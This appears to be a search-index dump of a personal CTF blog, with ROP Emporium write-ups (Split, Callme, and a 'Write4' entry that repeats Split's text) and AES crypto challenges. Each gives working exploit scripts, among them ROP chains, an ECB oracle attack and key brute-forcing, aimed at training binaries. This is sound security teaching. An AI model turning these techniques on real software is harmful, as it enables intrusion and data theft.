[{"categories":["rop"],"content":"Write4 challenge from ropemporium.com","date":"2022-05-14","objectID":"/write4/","tags":["returned-oriented programming","rop"],"title":"ROP - Write4","uri":"/write4/"},{"categories":["rop"],"content":"Description This challenge has been taken from https://ropemporium.com/challenge/write4.html. ","date":"2022-05-14","objectID":"/write4/:1:0","tags":["returned-oriented programming","rop"],"title":"ROP - Write4","uri":"/write4/"},{"categories":["rop"],"content":"How to build the ROP chain Download the challenge: curl --output split.zip https://ropemporium.com/binary/split.zip unzip split.zip \u0026\u0026 rm split.zip Since the string is contained in the executable, let’s start using rabin2 to locate it: rabin2 -z split [Strings] nth paddr vaddr len size section type string ――――――――――――――――――――――――――――――――――――――――――――――――――――――― 0 0x000007e8 0x004007e8 21 22 .rodata ascii split by ROP Emporium 1 0x000007fe 0x004007fe 7 8 .rodata ascii x86_64\\n 2 0x00000806 0x00400806 8 9 .rodata ascii \\nExiting 3 0x00000810 0x00400810 43 44 .rodata ascii Contriving a reason to ask user for data… 4 0x0000083f 0x0040083f 10 11 .rodata ascii Thank you! 5 0x0000084a 0x0040084a 7 8 .rodata ascii /bin/ls 0 0x00001060 0x00601060 17 18 .data ascii /bin/cat flag.txt The string is in 0x00601060. We also know that system is located somewhere, so check the imported functions from shared libraries: rabin2 -i split [Imports] nth vaddr bind type lib name ――――――――――――――――――――――――――――――――――――― 1 0x00400550 GLOBAL FUNC puts 2 0x00400560 GLOBAL FUNC system 3 0x00400570 GLOBAL FUNC printf 4 0x00400580 GLOBAL FUNC memset 5 0x00400590 GLOBAL FUNC read 6 0x00000000 GLOBAL FUNC __libc_start_main 7 0x00000000 WEAK NOTYPE gmon_start 8 0x004005a0 GLOBAL FUNC setvbuf Ok, system is imported, but what register should we set in order to store the parameter e.g. /bin/cat flag.txt? Listing the function written by the programmer could be a start…: rabin2 -qs split | grep -ve imp -e ' 0 ' 0x00601078 8 stdout x00601080 1 completed.7698 0x004006e8 90 pwnme 0x00400742 17 usefulFunction 0x004007d0 2 __libc_csu_fini 0x00601078 8 stdout@@GLIBC_2.2.5 0x004007e0 4 _IO_stdin_used 0x00601060 18 usefulString 0x00400760 101 __libc_csu_init 0x004005e0 2 _dl_relocate_static_pie 0x004005b0 43 _start 0x00400697 81 main Great! Then disassemble usefulFunction: pwndbg\u003e disass usefulFunction Dump of assembler code for function usefulFunction: 0x0000000000400742 \u003c+0\u003e: push rbp 0x0000000000400743 \u003c+1\u003e: mov rbp,rsp 0x0000000000400746 \u003c+4\u003e: mov edi,0x40084a 0x000000000040074b \u003c+9\u003e: call 0x400560 system@plt 0x0000000000400750 \u003c+14\u003e: nop 0x0000000000400751 \u003c+15\u003e: pop rbp 0x0000000000400752 \u003c+16\u003e: ret End of assembler dump. As we can see, the edi register is used to store the string, to verify that: pwndbg\u003e x/s 0x40084a 0x40084a: “/bin/ls” Enter to pwndbg (gdb-pwndbg split) and disassemble pwnme: pwndbg\u003e disass pwnme Dump of assembler code for function pwnme: 0x00000000004006e8 \u003c+0\u003e: push rbp 0x00000000004006e9 \u003c+1\u003e: mov rbp,rsp 0x00000000004006ec \u003c+4\u003e: sub rsp,0x20 0x00000000004006f0 \u003c+8\u003e: lea rax,[rbp-0x20] 0x00000000004006f4 \u003c+12\u003e: mov edx,0x20 0x00000000004006f9 \u003c+17\u003e: mov esi,0x0 0x00000000004006fe \u003c+22\u003e: mov rdi,rax 0x0000000000400701 \u003c+25\u003e: call 0x400580 \u003cmemset@plt\u003e 0x0000000000400706 \u003c+30\u003e: mov edi,0x400810 0x000000000040070b \u003c+35\u003e: call 0x400550 \u003cputs@plt\u003e 0x0000000000400710 \u003c+40\u003e: mov edi,0x40083c 0x0000000000400715 \u003c+45\u003e: mov eax,0x0 0x000000000040071a \u003c+50\u003e: call 0x400570 \u003cprintf@plt\u003e 0x000000000040071f \u003c+55\u003e: lea rax,[rbp-0x20] 0x0000000000400723 \u003c+59\u003e: mov edx,0x60 0x0000000000400728 \u003c+64\u003e: mov rsi,rax 0x000000000040072b \u003c+67\u003e: mov edi,0x0 0x0000000000400730 \u003c+72\u003e: call 0x400590 \u003cread@plt\u003e 0x0000000000400735 \u003c+77\u003e: mov edi,0x40083f 0x000000000040073a \u003c+82\u003e: call 0x400550 \u003cputs@plt\u003e 0x000000000040073f \u003c+87\u003e: nop 0x0000000000400740 \u003c+88\u003e: leave 0x0000000000400741 \u003c+89\u003e: ret End of assembler dump. As we can see there’s a rax,[rbp-0x20] instruction before the read operation. Here 0x20 is subtracted from rbp since they’re the bytes allocated to store the input string (32 bytes): if more chars are inserted it’s possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us. What remains to do is finding a gadget that pops a value from the stack and puts it into the edi register. ropper -f split 0x00000000004007c3: pop rdi; ret; Done. Now we can build the rop chain. At the ret instruction at the end","date":"2022-05-14","objectID":"/write4/:2:0","tags":["returned-oriented programming","rop"],"title":"ROP - Write4","uri":"/write4/"},{"categories":["rop"],"content":"Exploit To override the rsp register e.g. find the correct length of the first part of the payload I did some experiments putting a breakpoint in the ret instruction and see what is its content. I found that 40 bytes before p_gadget are needed. Moreover, the stack should be 16 bytes aligned so it’s necessary to add 4 bytes at the end of the payload. import pwn p = pwn.process(\"./split\") gdb_cmd = [ 'set disassembly-flavor intel', #'b *0x0000000000400735', #'b *0x0000000000400741', 'c', ] pwn.gdb.attach(p, gdbscript='\\n'.join(gdb_cmd)) # Address of system() p_system = 0x0040074b # Address of pop rdi, ret gadget p_gadget = 0x004007c3 # Address of \"/bin/cat flag.txt\" p_usefulString = 0x00601060 # Bytes needed to override rsp offset = 40 payload = b\"A\" * offset payload += pwn.p64(p_gadget) payload += pwn.p64(p_usefulString) payload += pwn.p64(p_system) payload += b\"A\" * 4 p.recvuntil(b'\\n\u003e') p.sendline(payload) p.interactive() python3 exploit.py [+] Starting local process ‘./split’: pid 101757 [*] running in new terminal: ['/usr/bin/gdb’, ‘-q’, ‘./split’, ‘101757’, ‘-x’, ‘/tmp/pwnywkpk4ct.gdb’] [+] Waiting for debugger: Done [*] Switching to interactive mode Thank you! ROPE{a_placeholder_32byte_flag!} $ ","date":"2022-05-14","objectID":"/write4/:3:0","tags":["returned-oriented programming","rop"],"title":"ROP - Write4","uri":"/write4/"},{"categories":["rop"],"content":"Split challenge from ropemporium.com","date":"2022-05-13","objectID":"/split/","tags":["returned-oriented programming","rop"],"title":"ROP - Split","uri":"/split/"},{"categories":["rop"],"content":"Description This challenge has been taken from https://ropemporium.com/challenge/split.html. The purpose is to call the system() function with /bin/cat flag.txt as parameter. We also know that this string is contained in a section inside our binary. More information in the linked website. ","date":"2022-05-13","objectID":"/split/:1:0","tags":["returned-oriented programming","rop"],"title":"ROP - Split","uri":"/split/"},{"categories":["rop"],"content":"How to build the ROP chain Download the challenge: $ curl --output split.zip https://ropemporium.com/binary/split.zip $ unzip split.zip \u0026\u0026 rm split.zip Since the string is contained in the executable, let’s start using rabin2 to locate it: $ rabin2 -z split [Strings] nth paddr vaddr len size section type string ――――――――――――――――――――――――――――――――――――――――――――――――――――――― 0 0x000007e8 0x004007e8 21 22 .rodata ascii split by ROP Emporium 1 0x000007fe 0x004007fe 7 8 .rodata ascii x86_64\\n 2 0x00000806 0x00400806 8 9 .rodata ascii \\nExiting 3 0x00000810 0x00400810 43 44 .rodata ascii Contriving a reason to ask user for data... 4 0x0000083f 0x0040083f 10 11 .rodata ascii Thank you! 5 0x0000084a 0x0040084a 7 8 .rodata ascii /bin/ls 0 0x00001060 0x00601060 17 18 .data ascii /bin/cat flag.txt The string is in 0x00601060. We also know that system is located somewhere, so check the imported functions from shared libraries: $ rabin2 -i split [Imports] nth vaddr bind type lib name ――――――――――――――――――――――――――――――――――――― 1 0x00400550 GLOBAL FUNC puts 2 0x00400560 GLOBAL FUNC system 3 0x00400570 GLOBAL FUNC printf 4 0x00400580 GLOBAL FUNC memset 5 0x00400590 GLOBAL FUNC read 6 0x00000000 GLOBAL FUNC __libc_start_main 7 0x00000000 WEAK NOTYPE __gmon_start__ 8 0x004005a0 GLOBAL FUNC setvbuf Ok, system is imported, but what register should we set in order to store the parameter e.g. /bin/cat flag.txt? Listing the function written by the programmer could be a start…: $ rabin2 -qs split | grep -ve imp -e ' 0 ' 0x00601078 8 stdout 0x00601080 1 completed.7698 0x004006e8 90 pwnme 0x00400742 17 usefulFunction 0x004007d0 2 __libc_csu_fini 0x00601078 8 stdout@@GLIBC_2.2.5 0x004007e0 4 _IO_stdin_used 0x00601060 18 usefulString 0x00400760 101 __libc_csu_init 0x004005e0 2 _dl_relocate_static_pie 0x004005b0 43 _start 0x00400697 81 main Great! Then disassemble usefulFunction: pwndbg\u003e disass usefulFunction Dump of assembler code for function usefulFunction: 0x0000000000400742 \u003c+0\u003e: push rbp 0x0000000000400743 \u003c+1\u003e: mov rbp,rsp 0x0000000000400746 \u003c+4\u003e: mov edi,0x40084a 0x000000000040074b \u003c+9\u003e: call 0x400560 \u003csystem@plt\u003e 0x0000000000400750 \u003c+14\u003e: nop 0x0000000000400751 \u003c+15\u003e: pop rbp 0x0000000000400752 \u003c+16\u003e: ret End of assembler dump. As we can see, the edi register is used to store the string, to verify that: pwndbg\u003e x/s 0x40084a 0x40084a: \"/bin/ls\" Enter to pwndbg (gdb-pwndbg split) and disassemble pwnme: pwndbg\u003e disass pwnme Dump of assembler code for function pwnme: 0x00000000004006e8 \u003c+0\u003e: push rbp 0x00000000004006e9 \u003c+1\u003e: mov rbp,rsp 0x00000000004006ec \u003c+4\u003e: sub rsp,0x20 0x00000000004006f0 \u003c+8\u003e: lea rax,[rbp-0x20] 0x00000000004006f4 \u003c+12\u003e: mov edx,0x20 0x00000000004006f9 \u003c+17\u003e: mov esi,0x0 0x00000000004006fe \u003c+22\u003e: mov rdi,rax 0x0000000000400701 \u003c+25\u003e: call 0x400580 \u003cmemset@plt\u003e 0x0000000000400706 \u003c+30\u003e: mov edi,0x400810 0x000000000040070b \u003c+35\u003e: call 0x400550 \u003cputs@plt\u003e 0x0000000000400710 \u003c+40\u003e: mov edi,0x40083c 0x0000000000400715 \u003c+45\u003e: mov eax,0x0 0x000000000040071a \u003c+50\u003e: call 0x400570 \u003cprintf@plt\u003e 0x000000000040071f \u003c+55\u003e: lea rax,[rbp-0x20] 0x0000000000400723 \u003c+59\u003e: mov edx,0x60 0x0000000000400728 \u003c+64\u003e: mov rsi,rax 0x000000000040072b \u003c+67\u003e: mov edi,0x0 0x0000000000400730 \u003c+72\u003e: call 0x400590 \u003cread@plt\u003e 0x0000000000400735 \u003c+77\u003e: mov edi,0x40083f 0x000000000040073a \u003c+82\u003e: call 0x400550 \u003cputs@plt\u003e 0x000000000040073f \u003c+87\u003e: nop 0x0000000000400740 \u003c+88\u003e: leave 0x0000000000400741 \u003c+89\u003e: ret End of assembler dump. As we can see there’s a rax,[rbp-0x20] instruction before the read operation. Here 0x20 is subtracted from rbp since they’re the bytes allocated to store the input string (32 bytes): if more chars are inserted it’s possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us. What remains to do is finding a gadget that pops a value from the stack and puts it into the edi register. $ ropper -f split 0x00000000004007c3: pop rdi; ret; Done. Now we can build the rop chain. At the ret i","date":"2022-05-13","objectID":"/split/:2:0","tags":["returned-oriented programming","rop"],"title":"ROP - Split","uri":"/split/"},{"categories":["rop"],"content":"Exploit To override the rsp register e.g. find the correct length of the first part of the payload I did some experiments putting a breakpoint in the ret instruction and see what is its content. I found that 40 bytes before p_gadget are needed. Moreover, the stack should be 16 bytes aligned so it’s necessary to add 4 bytes at the end of the payload. import pwn p = pwn.process(\"./split\") gdb_cmd = [ 'set disassembly-flavor intel', #'b *0x0000000000400735', #'b *0x0000000000400741', 'c', ] pwn.gdb.attach(p, gdbscript='\\n'.join(gdb_cmd)) # Address of system() p_system = 0x0040074b # Address of pop rdi, ret gadget p_gadget = 0x004007c3 # Address of \"/bin/cat flag.txt\" p_usefulString = 0x00601060 # Bytes needed to override rsp offset = 40 payload = b\"A\" * offset payload += pwn.p64(p_gadget) payload += pwn.p64(p_usefulString) payload += pwn.p64(p_system) payload += b\"A\" * 4 p.recvuntil(b'\\n\u003e') p.sendline(payload) p.interactive() $ python3 exploit.py [+] Starting local process './split': pid 101757 [*] running in new terminal: ['/usr/bin/gdb', '-q', './split', '101757', '-x', '/tmp/pwnywkpk4ct.gdb'] [+] Waiting for debugger: Done [*] Switching to interactive mode Thank you! ROPE{a_placeholder_32byte_flag!} $ ","date":"2022-05-13","objectID":"/split/:3:0","tags":["returned-oriented programming","rop"],"title":"ROP - Split","uri":"/split/"},{"categories":["rop"],"content":"Callme challenge from ropemporium.com","date":"2022-05-12","objectID":"/callme/","tags":["returned-oriented programming","rop"],"title":"ROP - Callme","uri":"/callme/"},{"categories":["rop"],"content":"Description This challenge has been taken from https://ropemporium.com/challenge/callme.html. The purpose is to change the flow of execution such that the functions callme_one, callme_two, and callme_three are called in sequence with 0xdeadbeefdeadbeef, 0xcafebabecafebabe, and 0xd00df00dd00df00d as parameters for each of them. More information in the linked website. ","date":"2022-05-12","objectID":"/callme/:1:0","tags":["returned-oriented programming","rop"],"title":"ROP - Callme","uri":"/callme/"},{"categories":["rop"],"content":"How to build the ROP chain Download the challenge: $ curl --output callme.zip https://ropemporium.com/binary/callme.zip $ unzip callme.zip \u0026\u0026 rm callme.zip First, let’s see the function written by the programmer: $ rabin2 -qs callme | grep -ve imp -e ' 0 ' 0x00601070 8 stdout 0x00601078 1 completed.7698 0x00400898 90 pwnme 0x004008f2 74 usefulFunction 0x004009b0 2 __libc_csu_fini 0x00601070 8 stdout@@GLIBC_2.2.5 0x004009c0 4 _IO_stdin_used 0x00400940 101 __libc_csu_init 0x00400790 2 _dl_relocate_static_pie 0x00400760 43 _start 0x00400847 81 main Enter to pwndbg (gdb-pwndbg callme) and disassemble pwnme and usefulFunction since we’re interested in them: pwndbg\u003e disass pwnme Dump of assembler code for function pwnme: 0x0000000000400898 \u003c+0: push rbp 0x0000000000400899 \u003c+1: mov rbp,rsp 0x000000000040089c \u003c+4: sub rsp,0x20 0x00000000004008a0 \u003c+8: lea rax,[rbp-0x20] 0x00000000004008a4 \u003c+12: mov edx,0x20 0x00000000004008a9 \u003c+17: mov esi,0x0 0x00000000004008ae \u003c+22: mov rdi,rax 0x00000000004008b1 \u003c+25: call 0x400700 \u003cmemset@plt 0x00000000004008b6 \u003c+30: mov edi,0x4009f0 0x00000000004008bb \u003c+35: call 0x4006d0 \u003cputs@plt 0x00000000004008c0 \u003c+40: mov edi,0x400a13 0x00000000004008c5 \u003c+45: mov eax,0x0 0x00000000004008ca \u003c+50: call 0x4006e0 \u003cprintf@plt 0x00000000004008cf \u003c+55: lea rax,[rbp-0x20] 0x00000000004008d3 \u003c+59: mov edx,0x200 0x00000000004008d8 \u003c+64: mov rsi,rax 0x00000000004008db \u003c+67: mov edi,0x0 0x00000000004008e0 \u003c+72: call 0x400710 \u003cread@plt 0x00000000004008e5 \u003c+77: mov edi,0x400a16 0x00000000004008ea \u003c+82: call 0x4006d0 \u003cputs@plt 0x00000000004008ef \u003c+87: nop 0x00000000004008f0 \u003c+88: leave 0x00000000004008f1 \u003c+89: ret End of assembler dump. As we can see there’s a rax,[rbp-0x20] instruction before the read operation. Here 0x20 is subtracted from rbp since they’re the bytes allocated to store the input string (32 bytes): if more chars are inserted it’s possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us. pwndbg\u003e disass usefulFunction Dump of assembler code for function usefulFunction: 0x00000000004008f2 \u003c+0: push rbp 0x00000000004008f3 \u003c+1: mov rbp,rsp 0x00000000004008f6 \u003c+4: mov edx,0x6 0x00000000004008fb \u003c+9: mov esi,0x5 0x0000000000400900 \u003c+14: mov edi,0x4 0x0000000000400905 \u003c+19: call 0x4006f0 \u003ccallme_three@plt 0x000000000040090a \u003c+24: mov edx,0x6 0x000000000040090f \u003c+29: mov esi,0x5 0x0000000000400914 \u003c+34: mov edi,0x4 0x0000000000400919 \u003c+39: call 0x400740 \u003ccallme_two@plt 0x000000000040091e \u003c+44: mov edx,0x6 0x0000000000400923 \u003c+49: mov esi,0x5 0x0000000000400928 \u003c+54: mov edi,0x4 0x000000000040092d \u003c+59: call 0x400720 \u003ccallme_one@plt 0x0000000000400932 \u003c+64: mov edi,0x1 0x0000000000400937 \u003c+69: call 0x400750 \u003cexit@plt End of assembler dump. This function is useful because: we can see that edx, esi, edi are the three registers used to store the parameters it contains the instruction addresses of the function calls (callme_one, callme_two, callme_three). Since it’s necessary to store values into edx, esi, edi, we need to find gadgets in the executables e.g. instructions which pop values in those registers and ends with a ret. ropper is a useful tool to find the available ones: $ ropper -f callme We can note that there’s a gadget which it’s the one we was looking for: 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; Now we have all the elements to build a rop chain. Here’s how the stack should be structured before the ret instruction in the pwnme function: | | | | | p_gadget | | 0xdeadbeefdeadbeef | | 0xcafebabecafebabe | | 0xd00df00dd00df00d | | callme_one | | p_gadget | | 0xdeadbeefdeadbeef | | 0xcafebabecafebabe | | 0xd00df00dd00df00d | | callme_two | | p_gadget | | 0xdeadbeefdeadbeef | | 0xcafebabecafebabe | | 0xd00df00dd00df00d | | callme_three | | ... | ---------------------- | V | | | | | 0x000000000040093c | | 0xdeadbeefdeadbeef | | 0xcafebabecafebabe | | 0xd00df00dd00df00d | | 0x0000000000400720 | | 0x000000000040093c | | 0xdeadbeefdeadb","date":"2022-05-12","objectID":"/callme/:2:0","tags":["returned-oriented programming","rop"],"title":"ROP - Callme","uri":"/callme/"},{"categories":["rop"],"content":"Exploit import pwn p = pwn.process(\"./callme\") gdb_cmd = [ 'set disassembly-flavor intel', #'b *0x0000000000400735', #'b *0x0000000000400741', 'c', ] pwn.gdb.attach(p, gdbscript='\\n'.join(gdb_cmd)) def build_callme_payload(p_callme): # rdi: first param # rsi: second \" # rdx: third \" rdi = 0xdeadbeefdeadbeef rsi = 0xcafebabecafebabe rdx = 0xd00df00dd00df00d return pwn.p64(rdi) + pwn.p64(rsi) + pwn.p64(rdx) + pwn.p64(p_callme) # 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; p_gadget = pwn.p64(0x000000000040093c) # start building payload payload = p_gadget * 6 # Callme One payload += build_callme_payload(0x400720) # Callme Two payload += p_gadget payload += build_callme_payload(0x400740) # Callme three payload += p_gadget payload += build_callme_payload(0x4006f0) p.recvuntil('\\n\u003e') p.sendline(payload) p.interactive() $ python3 exploit.py [+] Starting local process './callme': pid 15670 [*] running in new terminal: ['/usr/bin/gdb', '-q', './callme', '15670', '-x', '/tmp/pwnsm5xq4d2.gdb'] [+] Waiting for debugger: Done [*] Switching to interactive mode Thank you! [*] Process './callme' stopped with exit code 0 (pid 15670) callme_one() called correctly callme_two() called correctly ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive ","date":"2022-05-12","objectID":"/callme/:3:0","tags":["returned-oriented programming","rop"],"title":"ROP - Callme","uri":"/callme/"},{"categories":["crypto"],"content":"ECB oracle","date":"2022-04-07","objectID":"/ecb-oracle/","tags":["crypto","exploit","aes","ecb"],"title":"Crypto - ECB oracle","uri":"/ecb-oracle/"},{"categories":["crypto"],"content":"Description This challenge has been taken from http://aes.cryptohack.org/ecb_oracle/. What we have is an function that concats the FLAG to a plaintext given as parameter and encrypts it through EAS in ECB mode. Here’s chall.py: #!/usr/bin/python3 from flag import FLAG from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import os KEY = os.urandom(16) def encrypt(plaintext): plaintext = plaintext.encode() # concat plaintext with 16 - len(plaintext) bytes # with value 16 - len(plaintext) padded = pad(plaintext + FLAG.encode(), 16) cipher = AES.new(KEY, AES.MODE_ECB) try: encrypted = cipher.encrypt(padded) except ValueError as e: return {\"error\": str(e)} return encrypted.hex() if __name__ == '__main__': while True: plain = input(\"encrypt\u003e \") print(bytes.fromhex(encrypt(plain))) ","date":"2022-04-07","objectID":"/ecb-oracle/:1:0","tags":["crypto","exploit","aes","ecb"],"title":"Crypto - ECB oracle","uri":"/ecb-oracle/"},{"categories":["crypto"],"content":"Exploit Let’s first take a look how AES ECB works: We can state that: The flag is concatenated after the plaintext input; ECB encodes blocks of 16 bytes with the same key; The flag is 26 chars long. The main idea to exploit this bad implementation is to start to encode a string of: $$\\Bigl \\lceil \\dfrac{\\text{flagSize}}{\\text{blockSize}} \\Bigr \\rceil * \\text{blockSize} - 1$$ bytes, so in this case of 31. If we do so, there’s the first char of the flag that gets encrypted in the last byte of the second block. In order to solve this challenge we can brute force this last char and then repeat the process for the remaining characters decreasing the input plaintext. For instance, first plaintext that the oracle encrypts is the following one: $$\\text{Oracle}(\\text{“A”} * 31 + \\text{flag} + \\text{padding}) \\newline= E(\\text{“A”} * 16) + E(\\text{“A”} * 15 + ch_1) + E(ch_2 + … + ch_n + \\text{padding})$$ Proceed finding the next chars decrementing the size of the “A”‘s until the entire flag is known. Exploit.py: import requests from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import os from binascii import hexlify, unhexlify import string from pwn import process p = process(\"./chall.py\") def recvuntil_sendl(p, ustring, payload): p.recvuntil(ustring.encode()) p.sendline(payload.encode()) a = p.recvline().decode() # remove b and '' on the sides of the encrypted text a = a[2:-1] return list(bytes(a, \"utf-8\")) def getflag(p): flag = \"\" for i in range(1, 27): payload = \"A\" * (32 - i) answer = recvuntil_sendl(p, \"encrypt\u003e \", payload) # brute force the char for s in string.printable: bf = payload + flag + s bf_answer = recvuntil_sendl(p, \"encrypt\u003e \", bf) # each hex is two char so compare until 32 * 2 if bf_answer[0:32 * 2] == answer[0:32 * 2]: flag = flag + s break print(flag) getflag(p) p.close() python3 exploit.py [+] Starting local process ‘./chall.py’: pid 38213 flag{4tt3nt1_4d_u54r3_3cb} [*] Stopped process ‘./chall.py’ (pid 38213) ","date":"2022-04-07","objectID":"/ecb-oracle/:2:0","tags":["crypto","exploit","aes","ecb"],"title":"Crypto - ECB oracle","uri":"/ecb-oracle/"},{"categories":["crypto"],"content":"A password has been chosen as AES key","date":"2022-04-07","objectID":"/password-as-keys/","tags":["crypto","exploit","aes","ecb"],"title":"Crypto - Password as keys","uri":"/password-as-keys/"},{"categories":["crypto"],"content":"Description This challenge has been taken from http://aes.cryptohack.org/passwords_as_keys/. The FLAG has been encoded with the AES cipher in ECB mode using as key an hash of a predictable word (a bad password). The website gives us an API through which we can get the encoded flag and it’s also shown where the word has been drawn. Here’s the code: from Crypto.Cipher import AES import hashlib import random # /usr/share/dict/words from # https://gist.githubusercontent.com/wchargin/8927565/raw/d9783627c731268fb2935a731a618aa8e95cf465/words with open(\"/usr/share/dict/words\") as f: words = [w.strip() for w in f.readlines()] keyword = random.choice(words) KEY = hashlib.md5(keyword.encode()).digest() FLAG = ? @chal.route('/passwords_as_keys/decrypt/\u003cciphertext\u003e/\u003cpassword_hash\u003e/') def decrypt(ciphertext, password_hash): ciphertext = bytes.fromhex(ciphertext) key = bytes.fromhex(password_hash) cipher = AES.new(key, AES.MODE_ECB) try: decrypted = cipher.decrypt(ciphertext) except ValueError as e: return {\"error\": str(e)} return {\"plaintext\": decrypted.hex()} @chal.route('/passwords_as_keys/encrypt_flag/') def encrypt_flag(): cipher = AES.new(KEY, AES.MODE_ECB) encrypted = cipher.encrypt(FLAG.encode()) return {\"ciphertext\": encrypted.hex()} ","date":"2022-04-07","objectID":"/password-as-keys/:1:0","tags":["crypto","exploit","aes","ecb"],"title":"Crypto - Password as keys","uri":"/password-as-keys/"},{"categories":["crypto"],"content":"Exploit In order to find the flag first get the encoded FLAG and then brute force the key from the word dict: curl http://aes.cryptohack.org/passwords_as_keys/encrypt_flag/ {“ciphertext”:“c92b7734070205bdf6c0087a751466ec13ae15e6f1bcdd3f3a535ec0f4bbae66”} curl https://gist.githubusercontent.com/wchargin/8927565/raw/d9783627c731268fb2935a731a618aa8e95cf465/words \u003e words.txt from Crypto.Cipher import AES import hashlib import random # AES ECB decrypt def decrypt(ciphertext, password_hash): ciphertext = bytes.fromhex(ciphertext) key = bytes.fromhex(password_hash) cipher = AES.new(key, AES.MODE_ECB) try: decrypted = cipher.decrypt(ciphertext) except ValueError as e: return {\"error\": str(e)} return decrypted.hex() with open(\"words.txt\") as f: words = [w.strip() for w in f.readlines()] if __name__ == '__main__': # Encoded flag enc = \"c92b7734070205bdf6c0087a751466ec13ae15e6f1bcdd3f3a535ec0f4bbae66\" # The flag starts with \"crypto\" plain = ''.join(['{:02x}'.format(ord(c)) for c in \"crypto\"]) # Brute force the key for i in range(len(words)): key = hashlib.md5(words[i].encode()).digest().hex() res = decrypt(enc, key) if plain in res: print(bytearray.fromhex(res).decode()) break crypto{k3y5__r__n07__p455w0rdz?} ","date":"2022-04-07","objectID":"/password-as-keys/:2:0","tags":["crypto","exploit","aes","ecb"],"title":"Crypto - Password as keys","uri":"/password-as-keys/"},{"categories":["crypto"],"content":"A bad implementation of the AES in CBC mode choosed the key as the IV parameter, find the key","date":"2022-04-06","objectID":"/crypto-lazy-cbc/","tags":["crypto","exploit","aes","cbc"],"title":"Crypto - Lazy CBC","uri":"/crypto-lazy-cbc/"},{"categories":["crypto"],"content":"Description A bad implementation of the AES in CBC mode choosed the key as the IV (Initialization Vector) parameter, since it was considered not important to reach the scope. What we have is a python script which encodes every string you insert from stdin and the goal is to find the key e.i. the flag. ","date":"2022-04-06","objectID":"/crypto-lazy-cbc/:1:0","tags":["crypto","exploit","aes","cbc"],"title":"Crypto - Lazy CBC","uri":"/crypto-lazy-cbc/"},{"categories":["crypto"],"content":"Exploit #!/usr/bin/env python3 from Crypto.Cipher import AES from flag import FLAG key = FLAG.encode() def encrypt(plaintext, IV, key): if len(plaintext) % 16 != 0: return \"Input length must be multiple of 16\" plaintext = bytes.fromhex(plaintext) cipher = AES.new(key, AES.MODE_CBC, IV) enc = cipher.encrypt(plaintext) return enc.hex() def decrypt(ciphertext, IV, key): if len(ciphertext) % 16 != 0: return \"Input length must be multiple of 16\" cipher = AES.new(key, AES.MODE_CBC, IV) plain = cipher.decrypt(bytes.fromhex(ciphertext)) return plain.hex() if __name__ == '__main__': while True: print(\"1) Encrypt a message\") print(\"2) Decrypt a massage\") choice = str(input(\"\u003e \")) print(choice.encode()) if choice == \"1\": plain = input(\"enter message\u003e \") enc = encrypt(plain, key, key) print(enc) if choice == \"2\": ciphertext = input(\"enter ciphertext\u003e \") plain = decrypt(ciphertext, key, key) print(plain) Let’s take a look at AES encryption and decription in CBC mode: to solve this challenge we must play with the XOR operator: if in the encryption step we pass as plaintext a string of all zeros (16, the block size), for instance in the first block, the correspondent ciphertext will be the following: $$C_0 = E_0(\\text{IV} \\oplus P_0) = E_0(\\text{IV} \\oplus “0000000000000000”) = E_0(\\text{IV}) $$ because $$(1 \\oplus 0) = 1 \\text{ and } (0 \\oplus 0) = 0$$ Now, that’s the idea: since AES is a simmetric key cipher it uses the same key for the message decryption, so filling the first ciphertext block with all zeros and putting as \\(C_1\\) the \\(C_0\\) just discussed we can determine IV: $$P_1 = (“0000000000000000” \\oplus E_1(C_1)) \\newline = (“0000000000000000” \\oplus \\text{IV}) = \\text{IV}$$ Exploit: import pwn BLK_SIZE = 16 if __name__ == '__main__': p = pwn.process(\"./chall.py\") # Encrypt p.sendline(\"1\".encode()) p.recvuntil(\"enter message\u003e \".encode()) p.sendline(BLK_SIZE * \"00\".encode()) c2 = p.recvline().decode() c1 = \"00\" * BLK_SIZE # Decrypt p.sendline(\"2\".encode()) p.sendline((c1 + c2).encode()) p.recvuntil(\"enter ciphertext\u003e \".encode()) plain = p.recvline().decode() print(bytes.fromhex(str(plain))) p.close() python3 exploit.py [+] Starting local process ‘./chall.py’: pid 68990 b’\\x0cLN\\xd6\\x85\\x07\\xfa?z\\xaf\\xd6\\xf6\\xdea\u003cbflag{b4d_c1ph3r}’ [*] Stopped process ‘./chall.py’ (pid 68990) ","date":"2022-04-06","objectID":"/crypto-lazy-cbc/:2:0","tags":["crypto","exploit","aes","cbc"],"title":"Crypto - Lazy CBC","uri":"/crypto-lazy-cbc/"},{"categories":null,"content":"Me My name is Luca Fabri and I’m 22 y.o. I’m a master degree student at the University of Bologna (Italy). I graduated with a bachelor’s degree in computer science and engineering and I’m currently studying Artificial Intelligence. My interests in computer science also include cybersecurity topics. Contacts  Github: w-disaster  Email: luca.fabri1999@gmail.com  Instagram: luca.fabri ","date":"0001-01-01","objectID":"/about/:0:1","tags":null,"title":"About Me","uri":"/about/"}]